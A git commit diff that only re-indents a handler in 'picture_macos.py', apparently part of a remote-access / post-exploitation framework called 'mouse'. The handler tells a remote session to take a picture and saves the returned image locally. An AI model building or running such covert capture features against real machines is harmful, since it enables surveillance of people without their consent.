31cf90ba5f69e8d8bb2273eb5f86aeda0b0d2f23
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-04-07 22:47:56 +0300

    Update picture_macos.py

--- etc/core/commands/macos/picture_macos.py
+++ etc/core/commands/macos/picture_macos.py
@@ -53,43 +53,43 @@ class command:
 			   g = os.environ['HOME']
         		   os.chdir(g + "/mouse")
 			   return
-                        if dest[-1:] == "/":
-                            h.info_general("Saving to "+dest+"picture.jpg...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"picture.jpg!")
-                        else:
-                            h.info_general("Saving to "+dest+"/picture.jpg...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"/picture.jpg!")
-                    else:
-                        h.info_error("Local directory: "+dest+": does not exist!")
-                else:
-                    rp = os.path.split(dest)[0]
-                    if os.path.exists(rp):
-			if os.path.isdir(rp):
-			    pr = os.path.split(dest)[0]
-                            rp = os.path.split(dest)[1]
-			    h.info_general("Taking picture...")
-			    response = json.loads(session.send_command(cmd_data))
-			    try:
-		    	        success = response["status"]
-		                if success == 1:
-		                    size = int(response["size"])
-			            data = session.sock_receive_data(size)
-			            f = open(os.path.join(pr,rp),'w')
-			            f.write(data)
-			            f.close()
-		            except:
-		                h.info_error("Failed to take picture!")
-				g = os.environ['HOME']
-        			os.chdir(g + "/mouse")
-			        return
-                            h.info_general("Saving to "+dest+"...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"!")
-                        else:
-                            h.info_error("Error: "+rp+": not a directory!")
-                    else:
-                        h.info_error("Local directory: "+rp+": does not exist!")
-		g = os.environ['HOME']
-        	os.chdir(g + "/mouse")
+                       if dest[-1:] == "/":
+                           h.info_general("Saving to "+dest+"picture.jpg...")
+                           time.sleep(1)
+                           h.info_success("Saved to "+dest+"picture.jpg!")
+                       else:
+                           h.info_general("Saving to "+dest+"/picture.jpg...")
+                           time.sleep(1)
+                           h.info_success("Saved to "+dest+"/picture.jpg!")
+                   else:
+                       h.info_error("Local directory: "+dest+": does not exist!")
+               else:
+                   rp = os.path.split(dest)[0]
+                   if os.path.exists(rp):
+		       if os.path.isdir(rp):
+			   pr = os.path.split(dest)[0]
+                           rp = os.path.split(dest)[1]
+			   h.info_general("Taking picture...")
+			   response = json.loads(session.send_command(cmd_data))
+			   try:
+		    	       success = response["status"]
+		               if success == 1:
+		                   size = int(response["size"])
+			           data = session.sock_receive_data(size)
+			           f = open(os.path.join(pr,rp),'w')
+			           f.write(data)
+			           f.close()
+		           except:
+		               h.info_error("Failed to take picture!")
+			       g = os.environ['HOME']
+        		       os.chdir(g + "/mouse")
+			       return
+                           h.info_general("Saving to "+dest+"...")
+                           time.sleep(1)
+                           h.info_success("Saved to "+dest+"!")
+                       else:
+                           h.info_error("Error: "+rp+": not a directory!")
+                   else:
+                       h.info_error("Local directory: "+rp+": does not exist!")
+	       g = os.environ['HOME']
+               os.chdir(g + "/mouse")
